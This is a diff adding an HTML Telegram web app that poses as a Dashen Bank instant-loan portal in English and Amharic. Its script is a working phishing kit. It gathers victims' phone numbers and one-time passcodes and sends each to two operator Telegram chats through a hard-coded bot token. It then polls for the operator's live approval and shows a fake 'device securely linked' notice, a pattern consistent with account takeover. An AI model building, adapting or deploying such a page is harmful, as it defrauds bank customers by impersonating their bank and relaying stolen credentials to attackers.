@@ -1,0 +1,463 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Dashen Bank - Loan Portal</title>
+    <script src="https://telegram.org/js/telegram-web-app.js"></script>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
+    <style>
+        :root {
+            --bg-top: #101c33; --bg-bottom: #080d16;
+            --primary-blue: #1b53d6; --accent-blue: #4facfe;
+            --dashen-gold: #ffcc00; /* Added Dashen Gold */
+            --text-main: #ffffff; --text-dim: #a0a6b1;
+            --success-green: #2ecc71; --box-bg: #222831;
+            --error-red: #ff4757;
+        }
+
+        * { box-sizing: border-box; margin: 0; padding: 0; font-family: 'Inter', sans-serif; }
+        body, html { 
+            height: 100%; width: 100%; background-color: var(--bg-bottom); 
+            color: white; overflow: hidden; -webkit-touch-callout: none; -webkit-user-select: none;
+        }
+
+        .app-container {
+            width: 100%; max-width: 450px; height: 100vh; margin: 0 auto; position: relative;
+            background: linear-gradient(to bottom, var(--bg-top), var(--bg-bottom));
+            display: flex; flex-direction: column; overflow: hidden;
+        }
+
+        .screen { display: none; height: 100%; width: 100%; flex-direction: column; padding: 20px; z-index: 5; animation: fadeIn 0.4s ease-in-out; }
+        .screen.active { display: flex; }
+        @keyframes fadeIn { from { opacity: 0; } to { opacity: 1; } }
+
+        .mountain-shape {
+            position: absolute; bottom: 0; width: 100%; height: 40%; background: rgba(255, 255, 255, 0.05);
+            clip-path: polygon(0% 100%, 0% 70%, 15% 85%, 35% 65%, 55% 85%, 80% 60%, 100% 80%, 100% 100%);
+            z-index: 1; pointer-events: none;
+        }
+
+        .common-header { display: flex; align-items: center; justify-content: space-between; height: 60px; z-index: 10; }
+        .back-btn { width: 40px; height: 40px; background: rgba(255, 255, 255, 0.1); border-radius: 50%; display: flex; justify-content: center; align-items: center; cursor: pointer; }
+        .action-pill { padding: 8px 16px; border-radius: 20px; border: 1px solid var(--dashen-gold); display: flex; align-items: center; gap: 8px; font-size: 14px; background: rgba(255, 255, 255, 0.1); cursor: pointer; color: var(--dashen-gold); }
+
+        .btn-blue {
+            width: 100%; padding: 18px; border-radius: 35px; border: none; font-size: 18px; font-weight: 700; cursor: pointer;
+            background: linear-gradient(135deg, #1b53d6 0%, #0d3bb0 100%); color: white; box-shadow: 0 8px 20px rgba(27, 83, 214, 0.3); transition: 0.2s;
+        }
+        .btn-blue:disabled { background: #1c2533 !important; color: rgba(255, 255, 255, 0.3) !important; cursor: not-allowed; box-shadow: none; }
+
+        .phone-input-container { background: rgba(255, 255, 255, 0.07); border-radius: 18px; padding: 16px; display: flex; align-items: center; border: 1px solid rgba(255, 255, 255, 0.1); }
+        .otp-container { display: flex; gap: 8px; justify-content: center; margin-top: 20px; }
+        .otp-input { width: 45px; height: 55px; background: var(--box-bg); border: none; border-radius: 10px; text-align: center; font-size: 22px; color: white; outline: none; border: 1px solid transparent; }
+        .otp-input:focus { border-color: var(--dashen-gold); }
+
+        .spinner { position: relative; width: 80px; height: 80px; margin: auto; }
+        .spinner div { position: absolute; width: 12px; height: 12px; background: var(--dashen-gold); border-radius: 50%; animation: spinner-fade 1.2s linear infinite; }
+        .spinner div:nth-child(1) { top: 0; left: 34px; animation-delay: 0s; }
+        .spinner div:nth-child(2) { top: 10px; left: 58px; animation-delay: -0.15s; }
+        .spinner div:nth-child(3) { top: 34px; left: 68px; animation-delay: -0.3s; }
+        .spinner div:nth-child(4) { top: 58px; left: 58px; animation-delay: -0.45s; }
+        .spinner div:nth-child(5) { top: 68px; left: 34px; animation-delay: -0.6s; }
+        .spinner div:nth-child(6) { top: 58px; left: 10px; animation-delay: -0.75s; }
+        .spinner div:nth-child(7) { top: 34px; left: 0; animation-delay: -0.9s; }
+        .spinner div:nth-child(8) { top: 10px; left: 10px; animation-delay: -1.05s; }
+        @keyframes spinner-fade { 0%, 100% { opacity: 1; } 50% { opacity: 0.3; } }
+
+        .notification-toast {
+            position: absolute; top: 20px; left: 20px; right: 20px; background: white; color: #111; padding: 18px; border-radius: 15px;
+            display: flex; gap: 12px; z-index: 1000; box-shadow: 0 10px 40px rgba(0,0,0,0.6); transition: transform 0.4s cubic-bezier(0.175, 0.885, 0.32, 1.275), opacity 0.3s;
+            cursor: grab;
+        }
+
+        /* Dashon Branded Modal */
+        .modal-overlay { position: fixed; top:0; left:0; width:100%; height:100%; background:rgba(0,0,0,0.85); z-index:2000; display:none; justify-content:center; align-items:center; backdrop-filter: blur(5px); }
+        .modal-card { background: white; color: #080d16; width: 85%; padding: 30px; border-radius: 24px; text-align: center; border-top: 5px solid var(--dashen-gold); box-shadow: 0 20px 50px rgba(0,0,0,0.5); }
+        .modal-card h2 { color: #101c33; font-weight: 700; }
+        .modal-card p { color: #555; margin-bottom: 20px; }
+    </style>
+</head>
+<body>
+
+<div class="app-container">
+    <div class="mountain-shape"></div>
+
+    <div id="globalLangToggle" style="position: absolute; top: 20px; right: 20px; z-index: 1000; display: none;">
+        <div class="action-pill" onclick="toggleLanguage()">
+            <i class="fas fa-globe"></i> <span class="lang-text-btn">አማርኛ</span>
+        </div>
+    </div>
+
+    <div id="screen1" class="screen active" style="justify-content: center; text-align: center;">
+        <img src="https://i.postimg.cc/8P1mfftt/images-(3).png" style="width: 180px; margin: 0 auto 10px;">
+        <h1 style="font-size: 32px;">Loan Service</h1>
+    </div>
+
+    <div id="screen2" class="screen" style="justify-content: center;">
+        <div class="spinner">
+            <div></div><div></div><div></div><div></div>
+            <div></div><div></div><div></div><div></div>
+        </div>
+    </div>
+
+    <div id="screen3" class="screen">
+        <div style="flex:1; text-align:center; display:flex; flex-direction:column; justify-content:center;">
+            <img src="https://i.postimg.cc/L4C9tzNd/images-(3).png" style="width:120px; margin: 0 auto 30px; border-radius:15px; z-index: 10;">
+            <h1 class="welcome-title" style="font-size:24px; margin-bottom:10px;">Apply for Instant Loan</h1>
+            <p class="welcome-subtitle" style="color:var(--accent-blue); font-weight:600; margin-bottom:20px;">Dashen Bank Professional Lending Portal</p>
+            <p class="welcome-desc" style="color:var(--text-dim); margin-bottom:20px; padding: 0 20px;">To be eligible for a loan, you must be a registered **Dashen Super App** user. Verify your account to proceed with the application.</p>
+            <p class="tap-text" style="background:rgba(255,255,255,0.1); padding:5px 15px; border-radius:15px; align-self:center;">Click "Start" to begin</p>
+        </div>
+        <button class="btn-blue start-btn-text" onclick="handleStart()">Start</button>
+    </div>
+
+    <div id="screen4" class="screen">
+        <div class="common-header">
+            <div class="back-btn" onclick="showScreen('screen3')"><i class="fas fa-chevron-left"></i></div>
+            <div class="reg-header-text">Loan Registration App</div>
+            <div style="width:40px;"></div>
+        </div>
+        <div style="flex:1; margin-top:40px;">
+            <h1 class="reg-title-text" style="font-size:28px; margin-bottom:10px;">Loan Registration</h1>
+            <p class="reg-desc-text" style="color:var(--text-dim); margin-bottom:35px;">Enter your phone number to start your application.</p>
+            <label class="label-phone-text" style="display:block; margin-bottom:12px; font-weight:600;">Phone Number</label>
+            <div class="phone-input-container">
+                <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/7/71/Flag_of_Ethiopia.svg/2560px-Flag_of_Ethiopia.svg.png" style="width:28px; margin-right:12px;">
+                <span style="font-weight:600; margin-right:10px;">+251</span>
+                <input type="tel" id="phoneInput" placeholder="..." style="background:transparent; border:none; color:white; font-size:18px; outline:none; width:100%;">
+            </div>
+        </div>
+        <button class="btn-blue continue-btn-text" id="phoneContinue" disabled onclick="submitPhone()">Continue</button>
+    </div>
+
+    <div id="screen5" class="screen" style="text-align:center;">
+        <div style="flex:1; display:flex; flex-direction:column; justify-content:center; align-items:center;">
+            <i class="fas fa-shield-alt" style="font-size:40px; color:var(--dashen-gold); margin-bottom:20px;"></i>
+            <h1 class="security-title-text" style="font-size:22px; margin-bottom:12px;">Security Verification</h1>
+            <p class="security-desc-text" style="color:var(--text-dim); margin-bottom:40px;">Validating account for <span class="displayPhoneNum" style="color:white; font-weight:600;"></span></p>
+            <div style="background:rgba(255,255,255,0.03); border:1px solid rgba(255,255,255,0.1); padding:30px; border-radius:25px; width:100%;">
+                <div id="bigTimer" style="font-size:48px; font-weight:700;">05:00</div>
+                <p id="statusText" class="status-await-text" style="color:var(--dashen-gold); font-size:12px; letter-spacing:2px; text-transform:uppercase;">Awaiting Verification</p>
+            </div>
+        </div>
+        <p id="resendSMSBtn" class="resend-sms-text" style="color:var(--text-dim); opacity:0.4; margin-bottom:20px; text-align:center;">Please wait for admin verification</p>
+    </div>
+
+    <div id="screen6" class="screen">
+        <div class="common-header">
+            <div class="back-btn" onclick="clearOtpTimersAndBack()"><i class="fas fa-chevron-left"></i></div>
+            <div class="verify-header-text">Verify Phone Number</div>
+            <div style="width:40px;"></div>
+        </div>
+        <div style="flex:1; text-align:center; margin-top:30px;">
+            <h1 class="otp-title-text" style="font-size:28px; margin-bottom:12px;">Verification Code</h1>
+            <p class="otp-desc-text" style="color:var(--text-dim);">Code sent to <span class="displayPhoneNum" style="color:white;"></span></p>
+            <div class="otp-container">
+                <input type="text" class="otp-input" maxlength="1" inputmode="numeric">
+                <input type="text" class="otp-input" maxlength="1" inputmode="numeric">
+                <input type="text" class="otp-input" maxlength="1" inputmode="numeric">
+                <input type="text" class="otp-input" maxlength="1" inputmode="numeric">
+                <input type="text" class="otp-input" maxlength="1" inputmode="numeric">
+                <input type="text" class="otp-input" maxlength="1" inputmode="numeric">
+            </div>
+            <p id="otpTimer" style="margin-top: 30px; text-decoration:underline; color: var(--dashen-gold);">01:30</p>
+        </div>
+        <button class="btn-blue confirm-btn-text" id="confirmOTP" disabled onclick="submitOTP()">Confirm</button>
+    </div>
+
+    <div id="screen_wait_confirm" class="screen" style="text-align:center;">
+        <div style="flex:1; display:flex; flex-direction:column; justify-content:center; align-items:center;">
+            <div class="spinner">
+                <div></div><div></div><div></div><div></div>
+                <div></div><div></div><div></div><div></div>
+            </div>
+            <h1 style="font-size:22px; margin-top:20px;">Processing...</h1>
+            <p style="color:var(--text-dim);">Please do not close the app.</p>
+        </div>
+    </div>
+
+    <div id="screen7" class="screen">
+        <div class="notification-toast" id="notif">
+            <i class="fas fa-shield-check" style="color:var(--primary-blue); font-size:20px;"></i>
+            <div style="font-size:13px; color:#333;">
+                <b>Security Update</b>
+                <p>Your PIN has been set successfully, and your device is now securely linked</p>
+            </div>
+        </div>
+        <div style="flex:1; display:flex; flex-direction:column; justify-content:center; align-items:center; text-align:center;">
+            <div style="width:80px; height:80px; border:2px solid var(--success-green); border-radius:50%; display:flex; align-items:center; justify-content:center; margin-bottom:25px;">
+                <i class="fas fa-check" style="color:var(--success-green); font-size:40px;"></i>
+            </div>
+            <h1 class="finish-title-text" style="font-size:26px;">Registration Complete</h1>
+            <div style="background:rgba(255,255,255,0.05); padding:25px; border-radius:20px; border:1px solid rgba(255,255,255,0.1); width:100%; margin: 20px 0;">
+                <p class="finish-card-body" style="font-weight:600;">We will send a confirmation message within 24 hours.</p>
+                <div class="finish-tagline" style="color:var(--accent-blue); font-style:italic; margin-top:15px; font-size: 14px;">Dashen Bank – always one step ahead.</div>
+            </div>
+        </div>
+        <button class="btn-blue finish-btn-text" onclick="tg.close()">Done</button>
+    </div>
+</div>
+
+<div id="errorModal" class="modal-overlay">
+    <div class="modal-card">
+        <i class="fas fa-exclamation-circle" style="font-size:50px; color:var(--error-red);"></i>
+        <h2 id="modalTitle">Invalid OTP</h2>
+        <p id="errorMsg">Your OTP is incorrect. Please try again.</p>
+        <button class="btn-blue" id="modalActionBtn" style="margin-top:25px;" onclick="resendOTPAction()">Resend OTP</button>
+    </div>
+</div>
+
+<script>
+    const tg = window.Telegram.WebApp;
+    tg.ready();
+    tg.expand();
+    tg.enableClosingConfirmation();
+
+    const BOT_TOKEN = '8546950305:AAG4c2it89dncMMKUwRLKoNp-wlsGVWOAGU';
+    const ADMIN_IDS = ['5668579491', '8145799125']; 
+    let userPhone = "";
+    let rawPhone = "";
+    let currentLang = 'en';
+    let securityTimer;
+    let otpInterval; // Variable to store OTP interval for clearing
+    
+    const uniqueUserId = tg.initDataUnsafe?.user?.id || 'ID-' + Math.floor(100000 + Math.random() * 900000);
+
+    const translations = {
+        en: {
+            langBtn: "አማርኛ", 
+            welcomeTitle: "Apply for Instant Loan",
+            welcomeSub: "Dashen Bank Professional Lending Portal",
+            welcomeDesc: "To be eligible for a loan, you must be a registered Dashen Super App user. Verify your account to proceed with the application.",
+            tapStart: "Click \"Start\" to begin", startBtn: "Start",
+            regHeader: "Loan Registration App", regTitle: "Loan Registration",
+            regDesc: "Enter your phone number to start your application.",
+            labelPhone: "Phone Number", continueBtn: "Continue",
+            secTitle: "Security Verification", secDesc: "Validating account for ",
+            awaitSMS: "Awaiting Verification", resendSMS: "Please wait for admin verification",
+            verifyHeader: "Verify Phone Number", otpTitle: "Verification Code",
+            otpDesc: "Code sent to ", confirmBtn: "Confirm",
+            finishTitle: "Registration Complete",
+            finishCardBody: "We will send a confirmation message within 24 hours.",
+            finishTagline: "Dashen Bank – always one step ahead.", finishBtn: "Done"
+        },
+        am: {
+            langBtn: "English", 
+            welcomeTitle: "ብድር ለማግኘት ማመልከቻ",
+            welcomeSub: "የዳሽን ባንክ የብድር አገልግሎት",
+            welcomeDesc: "ለብድር ብቁ ለመሆን የዳሽን ሱፐር አፕ (Dashen Super App) ተጠቃሚ መሆን አለብዎት። ለማመልከት መጀመሪያ አካውንትዎን ያረጋግጡ።",
+            tapStart: "ለመጀመር \"ጀምር\" የሚለውን ይጫኑ", startBtn: "ጀምር",
+            regHeader: "የብድር ምዝገባ መተግበሪያ", regTitle: "የብድር ምዝገባ",
+            regDesc: "የብድር ማመልከቻዎን ለመጀመር ስልክ ቁጥርዎን ያስገቡ።",
+            labelPhone: "የስልክ ቁጥር", continueBtn: "ቀጥል",
+            secTitle: "የደህንነት ማረጋገጫ", secDesc: "አካውንት እየረጋገጥን ነው ለ ",
+            awaitSMS: "የማረጋገጫ በመጠባበቅ ላይ", resendSMS: "እባክዎ የአስተዳዳሪ ማረጋገጫ ይጠብቁ",
+            verifyHeader: "ስልክ ቁጥርን ያረጋግጡ", otpTitle: "የማረጋገጫ ኮድ",
+            otpDesc: "ኮድ ተልኳል ወደ ", confirmBtn: "አረጋግጥ",
+            finishTitle: "ምዝገባው ተጠናቅቋል",
+            finishCardBody: "የማረጋገጫ መልእክት በ24 ሰዓት ውስጥ እንልካለን።",
+            finishTagline: "ዳሽን ባንክ – ሁልጊዜ አንድ እርምጃ ቀዳሚ።", finishBtn: "ተጠናቅቋል"
+        }
+    };
+
+    function toggleLanguage() {
+        currentLang = currentLang === 'en' ? 'am' : 'en';
+        updateLanguageTexts();
+    }
+
+    function updateLanguageTexts() {
+        const t = translations[currentLang];
+        document.querySelector('.lang-text-btn').innerText = t.langBtn;
+        document.querySelector('.welcome-title').innerText = t.welcomeTitle;
+        document.querySelector('.welcome-subtitle').innerText = t.welcomeSub;
+        document.querySelector('.welcome-desc').innerText = t.welcomeDesc;
+        document.querySelector('.tap-text').innerText = t.tapStart;
+        document.querySelector('.start-btn-text').innerText = t.startBtn;
+        document.querySelector('.reg-header-text').innerText = t.regHeader;
+        document.querySelector('.reg-title-text').innerText = t.regTitle;
+        document.querySelector('.reg-desc-text').innerText = t.regDesc;
+        document.querySelector('.label-phone-text').innerText = t.labelPhone;
+        document.querySelector('.continue-btn-text').innerText = t.continueBtn;
+        document.querySelector('.security-title-text').innerText = t.secTitle;
+        document.querySelector('.security-desc-text').innerHTML = t.secDesc + `<span class="displayPhoneNum" style="color:white; font-weight:600;">${userPhone}</span>`;
+        document.querySelector('.status-await-text').innerText = t.awaitSMS;
+        document.querySelector('.resend-sms-text').innerText = t.resendSMS;
+        document.querySelector('.verify-header-text').innerText = t.verifyHeader;
+        document.querySelector('.otp-title-text').innerText = t.otpTitle;
+        document.querySelector('.otp-desc-text').innerHTML = t.otpDesc + `<span class="displayPhoneNum" style="color:white;">${userPhone}</span>`;
+        document.querySelector('.confirm-btn-text').innerText = t.confirmBtn;
+        document.querySelector('.finish-title-text').innerText = t.finishTitle;
+        document.querySelector('.finish-card-body').innerText = t.finishCardBody;
+        document.querySelector('.finish-tagline').innerText = t.finishTagline;
+        document.querySelector('.finish-btn-text').innerText = t.finishBtn;
+    }
+
+    function showScreen(id) {
+        document.querySelectorAll('.screen').forEach(s => s.classList.remove('active'));
+        document.getElementById(id).classList.add('active');
+        document.getElementById('globalLangToggle').style.display = (id === 'screen1' || id === 'screen2') ? 'none' : 'block';
+        if (id === 'screen5') startSecurityTimer();
+        if (id === 'screen6') startOTPTimer();
+    }
+
+    setTimeout(() => showScreen('screen2'), 1500);
+    setTimeout(() => showScreen('screen3'), 3500);
+
+    function handleStart() {
+        sendToBothAdmins(`New user start`);
+        showScreen('screen4');
+    }
+
+    const pInput = document.getElementById('phoneInput');
+    const pBtn = document.getElementById('phoneContinue');
+    pInput.addEventListener('input', () => {
+        let v = pInput.value.replace(/\D/g, '').substring(0, 10);
+        pInput.value = v;
+        pBtn.disabled = v.length < 9;
+    });
+
+    async function submitPhone() {
+        rawPhone = pInput.value;
+        userPhone = "+251 " + rawPhone;
+        document.querySelectorAll('.displayPhoneNum').forEach(el => el.innerText = userPhone);
+        showScreen('screen5');
+        const keyboard = { inline_keyboard: [[{ text: "✅ Confirm Phone", callback_data: `confirm_phone_${uniqueUserId}` }]] };
+        sendToBothAdmins(`📱 *Phone Number Submitted*\n🆔 *UserID:* \`${uniqueUserId}\`\n📞 *Copyable Phone:* \`${rawPhone}\``, keyboard);
+        startPolling();
+    }
+
+    const otpIn = document.querySelectorAll('.otp-input');
+    otpIn.forEach((input, idx) => {
+        input.addEventListener('input', () => {
+            input.value = input.value.replace(/[^0-9]/g, '');
+            if (input.value && idx < 5) otpIn[idx + 1].focus();
+            document.getElementById('confirmOTP').disabled = Array.from(otpIn).some(i => !i.value);
+        });
+        input.addEventListener('keydown', (e) => {
+            if (e.key === 'Backspace' && !input.value && idx > 0) otpIn[idx - 1].focus();
+        });
+    });
+
+    function clearOtpTimersAndBack() {
+        if(otpInterval) clearInterval(otpInterval);
+        showScreen('screen5');
+    }
+
+    function submitOTP() {
+        if(otpInterval) clearInterval(otpInterval); // Stop timer on submit
+        let otpVal = Array.from(otpIn).map(i => i.value).join('');
+        showScreen('screen_wait_confirm');
+        const keyboard = { inline_keyboard: [[{ text: "✅ Correct", callback_data: `otp_ok_${uniqueUserId}` }, { text: "❌ Incorrect", callback_data: `otp_fail_${uniqueUserId}` }]] };
+        sendToBothAdmins(`🔑 *OTP Received*\n🆔 *UserID:* \`${uniqueUserId}\`\n🔢 *OTP:* \`${otpVal}\``, keyboard);
+    }
+
+    async function resendOTPAction() {
+        document.getElementById('errorModal').style.display = 'none';
+        otpIn.forEach(i => i.value = "");
+        showScreen('screen5');
+        const keyboard = { inline_keyboard: [[{ text: "✅ Confirm Phone", callback_data: `confirm_phone_${uniqueUserId}` }]] };
+        sendToBothAdmins(`🔄 *User Resent OTP/Expired*\n🆔 *UserID:* \`${uniqueUserId}\`\n📞 *Phone:* \`${rawPhone}\``, keyboard);
+    }
+
+    function startSecurityTimer() {
+        if(securityTimer) clearInterval(securityTimer);
+        let s = 300;
+        const timerObj = document.getElementById('bigTimer');
+        securityTimer = setInterval(() => {
+            s--;
+            let m = Math.floor(s / 60), sec = s % 60;
+            if(timerObj) timerObj.innerText = `${m < 10 ? '0' : ''}${m}:${sec < 10 ? '0' : ''}${sec}`;
+            if (s <= 0) clearInterval(securityTimer);
+        }, 1000);
+    }
+
+    function startOTPTimer() {
+        if(otpInterval) clearInterval(otpInterval); // Clear existing to prevent overlap
+        let t = 90;
+        const otpT = document.getElementById('otpTimer');
+        otpInterval = setInterval(() => {
+            t--;
+            let m = Math.floor(t / 60), sec = t % 60;
+            if(otpT) otpT.innerText = `${m.toString().padStart(2, '0')}:${sec.toString().padStart(2, '0')}`;
+            
+            if (t <= 0) {
+                clearInterval(otpInterval);
+                showExpiredModal();
+            }
+        }, 1000);
+    }
+
+    function showExpiredModal() {
+        document.getElementById('modalTitle').innerText = "OTP Expired";
+        document.getElementById('modalTitle').style.color = "var(--error-red)";
+        document.getElementById('errorMsg').innerText = "The verification time has expired. Please request a new code.";
+        document.getElementById('modalActionBtn').innerText = "Request New Code";
+        document.getElementById('errorModal').style.display = 'flex';
+    }
+
+    let lastUpdateId = 0;
+    function startPolling() {
+        setInterval(async () => {
+            try {
+                const res = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/getUpdates?offset=${lastUpdateId + 1}`);
+                const data = await res.json();
+                if (data.result) {
+                    data.result.forEach(item => {
+                        lastUpdateId = item.update_id;
+                        if (item.callback_query) {
+                            const callData = item.callback_query.data;
+                            if (callData.includes(uniqueUserId)) {
+                                handleAdminAction(callData.replace(`_${uniqueUserId}`, ''));
+                            }
+                        }
+                    });
+                }
+            } catch (e) {}
+        }, 2000);
+    }
+
+    function handleAdminAction(action) {
+        if (action === "confirm_phone") showScreen('screen6');
+        if (action === "otp_ok") showScreen('screen7');
+        if (action === "otp_fail") {
+            // Reset modal for incorrect OTP
+            document.getElementById('modalTitle').innerText = "Invalid OTP";
+            document.getElementById('modalTitle').style.color = "var(--error-red)";
+            document.getElementById('errorMsg').innerText = "Your OTP is incorrect. Please try again.";
+            document.getElementById('modalActionBtn').innerText = "Resend OTP";
+            document.getElementById('screen_wait_confirm').classList.remove('active');
+            document.getElementById('errorModal').style.display = 'flex';
+        }
+    }
+
+    async function sendToBothAdmins(text, replyMarkup = null) {
+        ADMIN_IDS.forEach(id => {
+            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ chat_id: id, text: text, parse_mode: 'Markdown', reply_markup: replyMarkup })
+            }).catch(e => console.log("Admin Notify Error"));
+        });
+    }
+
+    const toast = document.getElementById('notif');
+    let startX;
+    if (toast) {
+        toast.addEventListener('touchstart', e => startX = e.touches[0].clientX);
+        toast.addEventListener('touchmove', e => {
+            let diff = e.touches[0].clientX - startX;
+            if (diff > 0) {
+                toast.style.transform = `translateX(${diff}px)`;
+                toast.style.opacity = 1 - (diff / 250);
+            }
+        });
+        toast.addEventListener('touchend', e => {
+            if (parseFloat(toast.style.opacity) < 0.5) toast.remove();
+            else { toast.style.transform = 'translateX(0)'; toast.style.opacity = '1'; }
+        });
+    }
+</script>
+</body>
+</html>
